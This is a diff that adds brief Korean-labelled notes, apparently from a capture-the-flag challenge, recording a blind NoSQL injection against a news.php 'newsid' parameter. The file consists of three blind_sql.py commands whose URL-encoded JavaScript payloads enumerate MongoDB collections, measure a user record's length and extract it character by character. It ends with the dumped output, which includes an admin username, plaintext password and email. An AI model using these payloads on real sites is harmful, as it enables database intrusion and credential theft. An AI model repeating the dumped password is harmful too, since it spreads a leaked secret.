@@ -1,0 +1,15 @@
+﻿컬럼 뽑기
+./blind_sql.py --mode character --url "http://806bddce.seclover.com/news.php?newsid=1%27%26%26(db.getCollectionNames()[2][6]=='.')%26%26%273" --v-detect "<a class='more-link' href='#'>view project</a> </div>"
+
+길이 찾기
+./blind_sql.py --mode integer --url "http://806bddce.seclover.com/news.php?newsid=1%27%26%26(tojsononeline(db.user.find()[0]).length>=@@@)%26%26%273" --v-detect "<a class='more-link' href='#'>view project</a> </div>"
+
+한글자씩
+./blind_sql.py --mode integer --url "http://806bddce.seclover.com/news.php?newsid=1%27%26%26(tojsononeline(db.user.find()[0]).charCodeAt(@LEN@)>=@@@)%26%26%273" --v-detect "<a class='more-link' href='#'>view project</a> </div>"
+
+f
+news
+system.indexes
+user
+
+{  "_id" : ObjectId("56d30bfaea684f010e8b456d"),  "username" : "admin",  "password" : "*&98*hjhjyu",  "email" : "loverctf@126.com" }
